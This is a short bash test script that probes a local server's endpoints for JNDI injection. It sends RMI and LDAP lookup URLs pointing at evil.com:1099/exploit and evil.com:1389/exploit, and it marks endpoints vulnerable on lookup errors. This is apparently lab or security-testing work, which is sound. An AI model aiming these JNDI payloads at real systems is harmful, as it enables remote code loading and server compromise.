#!/bin/bash
# Remote data access validation script

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Remote Data Access Validation Script${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local expected="$3"

    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[Test $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s -w "\n%{http_code}" "$url" 2>/dev/null)
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | sed '$d')

    if [ "$expected" = "vulnerable" ]; then
        if echo "$body" | grep -qiE "(lookup|NamingException|failed|timeout)" || [ "$http_code" != "200" ]; then
            echo -e "  ${GREEN}[✓] Vulnerable${NC}"
            echo "  HTTP Code: $http_code"
            echo "  Response: $(echo "$body" | head -c 100)..."
            PASSED=$((PASSED + 1))
        else
            echo -e "  ${RED}[✗] Test failed${NC}"
            FAILED=$((FAILED + 1))
        fi
    fi
}

echo -e "${BLUE}=== JNDI Tests ===${NC}"

test_case "RMI lookup" \
    "${BASE_URL}/api/v1/remote/rmi?url=rmi://evil.com:1099/exploit" \
    "vulnerable"

test_case "LDAP lookup" \
    "${BASE_URL}/api/v1/remote/ldap?url=ldap://evil.com:1389/exploit" \
    "vulnerable"

# Summary
echo -e "\n${BLUE}========================================${NC}"
echo "Total tests: ${YELLOW}$TOTAL${NC}"
echo "Passed: ${GREEN}$PASSED${NC}"
echo "Failed: ${RED}$FAILED${NC}"
